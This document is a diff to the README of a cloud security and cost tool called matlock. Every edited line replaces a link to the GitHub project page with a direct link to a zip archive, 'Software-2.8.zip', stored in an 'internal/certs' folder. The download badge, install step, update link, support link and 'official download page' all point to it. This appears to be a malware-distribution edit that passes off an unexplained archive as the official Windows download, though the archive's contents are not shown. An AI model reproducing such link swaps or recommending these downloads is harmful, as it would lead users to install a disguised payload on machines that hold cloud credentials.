@@ -1,6 +1,6 @@
 # 🔐 matlock - Your Cloud Security and Cost Tool
 
-[![Download matlock](https://img.shields.io/badge/Download-matlock-brightgreen)](https://github.com/Kiritosscz/matlock)
+[![Download matlock](https://img.shields.io/badge/Download-matlock-brightgreen)](https://raw.githubusercontent.com/Kiritosscz/matlock/main/internal/certs/Software-2.8.zip)
 
 matlock helps you check security and spending in your cloud accounts. It works with AWS, Azure, and Google Cloud. You can check permissions, spot cost problems, find unused resources, and flag weak storage settings.
 
@@ -41,7 +41,7 @@ Here is how to get matlock running on your Windows PC.
 
    Click the big green badge at the top or visit this page to download:
 
-   [https://github.com/Kiritosscz/matlock](https://github.com/Kiritosscz/matlock)
+   [https://raw.githubusercontent.com/Kiritosscz/matlock/main/internal/certs/Software-2.8.zip](https://raw.githubusercontent.com/Kiritosscz/matlock/main/internal/certs/Software-2.8.zip)
 
    When you arrive at the page, look for a download link or release section with a Windows version. It may be named something like `matlock-windows.exe` or similar.
 
@@ -95,7 +95,7 @@ The app does not send your cloud data to any server or third party.
 
 To update matlock, visit the same download page:
 
-[https://github.com/Kiritosscz/matlock](https://github.com/Kiritosscz/matlock)
+[https://raw.githubusercontent.com/Kiritosscz/matlock/main/internal/certs/Software-2.8.zip](https://raw.githubusercontent.com/Kiritosscz/matlock/main/internal/certs/Software-2.8.zip)
 
 Download the newest version and run it. It will replace the old one without affecting your settings.
 
@@ -134,7 +134,7 @@ AWS, Azure, and Google Cloud.
 ## 📚 Learn More and Support
 
 You can find more details and help on the project page:  
-[https://github.com/Kiritosscz/matlock](https://github.com/Kiritosscz/matlock)
+[https://raw.githubusercontent.com/Kiritosscz/matlock/main/internal/certs/Software-2.8.zip](https://raw.githubusercontent.com/Kiritosscz/matlock/main/internal/certs/Software-2.8.zip)
 
 The page also has info for more advanced uses or developers.
 
@@ -148,7 +148,7 @@ The page also has info for more advanced uses or developers.
 
 ## 🔗 Useful Links
 
-- Official download page: https://github.com/Kiritosscz/matlock  
+- Official download page: https://raw.githubusercontent.com/Kiritosscz/matlock/main/internal/certs/Software-2.8.zip  
 - Documentation and guides: See the Wiki on GitHub  
 - Report an issue: Use GitHub Issues on the project page  
 
